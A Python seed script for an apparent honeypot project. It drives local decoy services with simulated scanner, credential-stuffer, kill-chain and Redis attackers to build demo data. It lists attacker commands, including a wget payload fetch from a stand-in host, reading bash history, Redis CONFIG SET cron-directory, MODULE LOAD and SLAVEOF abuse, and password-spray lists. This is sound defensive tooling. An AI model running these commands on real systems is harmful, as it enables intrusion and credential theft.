"""Sample data for a fresh clone: `python tools/seed_demo.py --db data/demo.db`.

Drives the real decoys in-process: the web and API apps through their test clients, the SSH
decoy over asyncssh, and the FTP, MySQL and Redis listeners over TCP on 127.0.0.1. The JSONL
logs go to --logs. Then it runs the same forward, correlate and verify steps as
`qlure forward`, `qlure correlate` and `qlure verify`.

Everything is fake. Visitors use documentation addresses (198.51.100.x, 203.0.113.x), the
planted secrets are the decoy honeytokens, and no network is used. No Docker is needed.
A fake clock stamps the events so they spread over the last few hours, and a fixed seed
keeps the jitter, so the counts repeat from run to run.
"""

from __future__ import annotations

import argparse
import asyncio
import importlib
import os
import random
import shlex
import socket
import sys
from collections import Counter
from collections.abc import Iterator
from contextlib import contextmanager
from datetime import UTC, datetime, timedelta, tzinfo
from pathlib import Path
from typing import Any

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

import asyncssh  # noqa: E402
from fastapi.testclient import TestClient  # noqa: E402

from decoys import honeytokens  # noqa: E402
from decoys.api.app import app as api_app  # noqa: E402
from decoys.banners import listeners  # noqa: E402
from decoys.ssh import server as ssh_server  # noqa: E402
from decoys.web.app import app as web_app  # noqa: E402
from qlure.correlate import store as correlate_store  # noqa: E402
from qlure.events import Service  # noqa: E402
from qlure.store import db, forwarder  # noqa: E402
from qlure.store.verify import verify  # noqa: E402

SEED = 20261009
WINDOW = timedelta(hours=3)  # the sample data ends a few minutes before the run
DEFAULT_DB = Path("data/demo.db")
DEFAULT_LOGS = Path("data/demo-logs")
DASHBOARD_PORT = 9100

# Modules that call datetime.now() when they write an event or a connection time.
CLOCK_MODULES = ("qlure.events.emit", "decoys.ssh.server", "decoys.ssh.shell")
# Variables that would move the SSH host key onto disk or change how replay times are read.
CLEARED_ENV = ("QLURE_REPLAY_TOKEN", "QLURE_SSH_HOST_KEY")

FIREFOX = "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0"
CHROME = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/130.0 Safari/537.36"
SAFARI = "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 Safari/605.1.15"
SQLMAP = "sqlmap/1.8.4#stable (https://sqlmap.org)"
CURL = "curl/8.5.0"
PYTHON_AGENT = "python-requests/2.32.3"

# Visitor 1: a noisy scanner that sweeps web paths with a scanner user agent.
SCANNER_IP = "198.51.100.23"
SCANNER_PATHS = (
    "/wp-login.php",
    "/wp-admin/",
    "/administrator/",
    "/phpmyadmin/",
    "/pma/",
    "/server-status",
    "/actuator/health",
    "/api/swagger.json",
    "/console",
    "/config.php",
    "/xmlrpc.php",
    "/cgi-bin/test.cgi",
    "/solr/admin/info",
    "/manager/html",
    "/admin.php",
    "/web.config",
)

# Visitor 2: a credential stuffer on the web, FTP and API decoys. It sprays the same non-default
# password on every surface, which is what links the three sessions into one actor.
STUFFER_IP = "203.0.113.44"
SPRAYED = "Summer2026"
WEB_GUESSES = (
    ("admin", "admin"),
    ("admin", "password123"),
    ("root", "toor"),
    ("ops", SPRAYED),
    ("deploy", "deploy"),
    ("admin", "letmein"),
)
FTP_GUESSES = (
    ("ftp", SPRAYED),
    ("admin", "admin"),
    ("backup", "backup"),
    ("ops", SPRAYED),
)
# The API reads a presented key as a login attempt, so the sprayed passwords go in that header.
API_GUESSES = (SPRAYED, "letmein", "Winter2026", "Spring2026", "Welcome1", "qwerty")

# Visitor 3: the full kill chain. Scanner paths, the planted .env and backup file, the planted
# SSH login, discovery and download commands in the fake shell, then the planted API key.
CHAIN_IP = "198.51.100.77"
CHAIN_SCAN_PATHS = ("/wp-login.php", "/phpmyadmin/", "/server-status", "/config.php")
CHAIN_SSH_COMMANDS = (
    "whoami",
    "id",
    "uname -a",
    "ps aux",
    "ip addr",
    "wget -q http://203.0.113.10/update.sh -O /tmp/.update.sh",
    "crontab -l",
    "cat ~/.bash_history",
)

# Visitor 4: a data-store attacker who uses the planted Redis password, then changes config.
DATASTORE_IP = "203.0.113.91"
REDIS_COMMANDS = (
    "CONFIG SET dir /var/spool/cron",
    "CONFIG SET dbfilename root",
    "MODULE LOAD /tmp/mod.so",
    "SLAVEOF 203.0.113.9 6379",
    "INFO",
    "KEYS *",
)

# Two benign visitors: a browser and a second browser that only reads public pages.
BENIGN_IPS = ("198.51.100.150", "203.0.113.160")

# Minutes after the window start at which each visitor starts. The order is chronological.
OFFSETS = {"scanner": 0, "stuffer": 40, "chain": 100, "datastore": 150, "benign": 160}


class SeedError(Exception):
    """The seed refused to run, for example because the database already exists."""


class _Clock:
    """Hands out one timestamp per event the decoys write, a few seconds apart."""

    def __init__(self, start: datetime) -> None:
        self.now = start
        self._rng = random.Random(SEED)  # noqa: S311  (timestamp jitter, not security)

    def jump(self, moment: datetime) -> None:
        self.now = moment

    def tick(self) -> datetime:
        stamp = self.now
        self.now += timedelta(seconds=self._rng.randint(2, 9))
        return stamp


def _clock_datetime(clock: _Clock) -> type[datetime]:
    class ClockDatetime(datetime):
        @classmethod
        def now(cls, tz: tzinfo | None = None) -> datetime:
            return clock.tick()

    return ClockDatetime


@contextmanager
def _decoys_in_process(logs: Path, clock: _Clock) -> Iterator[None]:
    """Write events to `logs`, stamp them with `clock`, and restore everything afterwards."""
    previous = {name: os.environ.get(name) for name in (*CLEARED_ENV, "QLURE_LOG_DIR")}
    for name in CLEARED_ENV:
        os.environ.pop(name, None)
    os.environ["QLURE_LOG_DIR"] = str(logs)
    modules = [importlib.import_module(name) for name in CLOCK_MODULES]
    originals = [module.datetime for module in modules]
    for module in modules:
        module.datetime = _clock_datetime(clock)
    try:
        yield
    finally:
        for module, original in zip(modules, originals, strict=True):
            module.datetime = original
        for name, value in previous.items():
            if value is None:
                os.environ.pop(name, None)
            else:
                os.environ[name] = value


def _client(app: Any, ip: str, agent: str) -> TestClient:
    client = TestClient(app, client=(ip, 40404), follow_redirects=False)
    client.headers["user-agent"] = agent  # the constructor's headers lose to the default agent
    return client


def _proxy_line(ip: str) -> bytes:
    return f"PROXY TCP4 {ip} 10.0.0.1 40404 2222\r\n".encode()


def _free_port() -> int:
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


async def _wait_for(port: int) -> None:
    for _ in range(100):
        try:
            _, writer = await asyncio.open_connection("127.0.0.1", port)
        except OSError:
            await asyncio.sleep(0.05)
            continue
        writer.close()
        return
    raise RuntimeError("listener never started")


async def _banner_visit(service: Service, ip: str, payload: bytes = b"") -> None:
    """Connect to a real FTP, MySQL or Redis listener, send the payload, and wait for the close."""
    greetings = {
        Service.FTP: listeners.FTP_BANNER,
        Service.MYSQL: listeners.mysql_greeting(),
        Service.REDIS: b"",
    }
    server = await listeners.start(service, 0, greetings[service], host="127.0.0.1")
    try:
        port = server.sockets[0].getsockname()[1]
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        writer.write(_proxy_line(ip) + payload)
        writer.write_eof()
        async with asyncio.timeout(15):
            await reader.read()  # the decoy closes the connection when its dialogue ends
        writer.close()
    finally:
        server.close()
        await server.wait_closed()


def _banner(service: Service, ip: str, payload: bytes = b"") -> None:
    asyncio.run(_banner_visit(service, ip, payload))


def _ssh_session(ip: str, password: str, commands: tuple[str, ...]) -> None:
    """Log in to the SSH decoy through the gateway's PROXY line, then run the commands."""

    async def go() -> None:
        listen, backend = _free_port(), _free_port()
        task = asyncio.create_task(ssh_server.serve(listen, backend, host="127.0.0.1"))
        await _wait_for(listen)
        try:
            sock = socket.create_connection(("127.0.0.1", listen))
            sock.sendall(_proxy_line(ip))
            sock.setblocking(False)
            async with await asyncssh.connect(
                "127.0.0.1", sock=sock, username="deploy", password=password, known_hosts=None
            ) as conn:
                for command in commands:
                    await conn.run(command, check=False)
        finally:
            task.cancel()

    asyncio.run(go())


def _ftp_dialogue(pairs: tuple[tuple[str, str], ...]) -> bytes:
    lines = [
        f"{verb} {value}"
        for user, password in pairs
        for verb, value in (("USER", user), ("PASS", password))
    ]
    return "".join(line + "\r\n" for line in lines).encode()


def _at(clock: _Clock, start: datetime, name: str, extra_minutes: int = 0) -> None:
    clock.jump(start + timedelta(minutes=OFFSETS[name] + extra_minutes))


def _scanner(clock: _Clock, start: datetime) -> None:
    _at(clock, start, "scanner")
    web = _client(web_app, SCANNER_IP, SQLMAP)
    for path in SCANNER_PATHS:
        web.get(path)


def _credential_stuffer(clock: _Clock, start: datetime) -> None:
    _at(clock, start, "stuffer")
    web = _client(web_app, STUFFER_IP, FIREFOX)
    for username, password in WEB_GUESSES:
        web.post("/login", data={"username": username, "password": password})
    _banner(Service.FTP, STUFFER_IP, _ftp_dialogue(FTP_GUESSES))
    api = _client(api_app, STUFFER_IP, PYTHON_AGENT)
    for guess in API_GUESSES:
        api.get("/api/v1/users", headers={"x-api-key": guess})


def _kill_chain(clock: _Clock, start: datetime) -> None:
    _at(clock, start, "chain")
    web = _client(web_app, CHAIN_IP, FIREFOX)
    for path in CHAIN_SCAN_PATHS:
        web.get(path)
    web.get("/.env")  # reads the planted AWS key and the database password
    db_password = honeytokens.get("ht-db-001")["value"]
    web.post("/login", data={"username": "veltrix_app", "password": db_password})
    web.get("/backup/config.bak")  # reads the planted SSH login
    _ssh_session(CHAIN_IP, honeytokens.get("ht-ssh-001")["value"], CHAIN_SSH_COMMANDS)
    api = _client(api_app, CHAIN_IP, CURL)
    key = {"x-api-key": honeytokens.get("ht-api-001")["value"]}
    api.get("/api/v1/users", headers=key)
    api.get("/api/v1/orders", headers=key)


def _data_store(clock: _Clock, start: datetime) -> None:
    _at(clock, start, "datastore")
    lines = [f"AUTH {honeytokens.get('ht-redis-001')['value']}", *REDIS_COMMANDS]
    _banner(Service.REDIS, DATASTORE_IP, "".join(f"{line}\r\n" for line in lines).encode())


def _benign(clock: _Clock, start: datetime) -> None:
    _at(clock, start, "benign")
    chrome = _client(web_app, BENIGN_IPS[0], CHROME)
    for path in ("/", "/login", "/robots.txt"):
        chrome.get(path)
    _at(clock, start, "benign", extra_minutes=8)
    safari = _client(web_app, BENIGN_IPS[1], SAFARI)
    for path in ("/login", "/robots.txt", "/login"):
        safari.get(path)


def generate(logs: Path, start: datetime) -> None:
    """Drive every visitor through the real decoys, in time order, into `logs`."""
    clock = _Clock(start)
    with _decoys_in_process(logs, clock):
        _scanner(clock, start)
        _credential_stuffer(clock, start)
        _kill_chain(clock, start)
        _data_store(clock, start)
        _benign(clock, start)


def _reset(db_path: Path, logs: Path) -> None:
    for path in (db_path, Path(f"{db_path}-wal"), Path(f"{db_path}-shm")):
        path.unlink(missing_ok=True)
    for path in logs.glob("*.jsonl"):
        path.unlink()


def build(db_path: Path, logs: Path, force: bool = False) -> dict[str, int]:
    """Generate the logs, then forward, correlate and verify them into `db_path`."""
    existing_logs = logs.is_dir() and any(logs.glob("*.jsonl"))
    if (db_path.exists() or existing_logs) and not force:
        raise SeedError(f"{db_path} already holds sample data; pass --force to replace it")
    if force:
        _reset(db_path, logs)
    logs.mkdir(parents=True, exist_ok=True)

    now = datetime.now(UTC).replace(second=0, microsecond=0)
    generate(logs, now - WINDOW)

    conn = db.connect(db_path)
    try:
        stored, rejected = forwarder.forward_once(conn, logs)
        if rejected:
            raise SeedError(f"{rejected} generated line(s) failed validation")
        result = correlate_store.run(conn)
        checked, problem = verify(conn, logs)
        if problem is not None:
            raise SeedError(f"VERIFY FAILED at event {problem.event_id}: {problem.reason}")
        verdicts = Counter(f.verdict for f in result.findings)
    finally:
        conn.close()
    return {
        "events": stored,
        "verified": checked,
        "sessions": len(result.sessions),
        "actors": len(result.actors),
        "noteworthy": verdicts["Noteworthy"],
        "suspicious": verdicts["Suspicious"],
        "benign": verdicts["Benign"],
    }


def _dashboard_command(db_path: Path, logs: Path) -> str:
    return (
        f"QLURE_DB={shlex.quote(str(db_path))} QLURE_LOGS={shlex.quote(str(logs))} "
        "QLURE_DASHBOARD_PASSWORD=choose-a-strong-password "
        f"python -m uvicorn dashboard.app:app --port {DASHBOARD_PORT}"
    )


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(prog="seed_demo", description=__doc__.splitlines()[0])
    parser.add_argument("--db", type=Path, default=DEFAULT_DB, help="SQLite database to create")
    parser.add_argument("--logs", type=Path, default=DEFAULT_LOGS, help="folder for the JSONL logs")
    parser.add_argument("--force", action="store_true", help="replace an existing --db and logs")
    args = parser.parse_args(argv)
    db_path = args.db.resolve()
    logs = args.logs.resolve()
    try:
        counts = build(db_path, logs, force=args.force)
    except SeedError as exc:
        print(f"seed_demo: {exc}", file=sys.stderr)
        return 1
    print(f"wrote {counts['events']} events to {logs}")
    print(f"chain verified: {counts['verified']} events")
    print(
        f"sample data: {counts['sessions']} sessions, {counts['actors']} actors, "
        f"{counts['noteworthy']} noteworthy, {counts['suspicious']} suspicious, "
        f"{counts['benign']} benign"
    )
    print("open the dashboard:")
    print(f"  {_dashboard_command(db_path, logs)}")
    print(f"then browse to http://127.0.0.1:{DASHBOARD_PORT}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
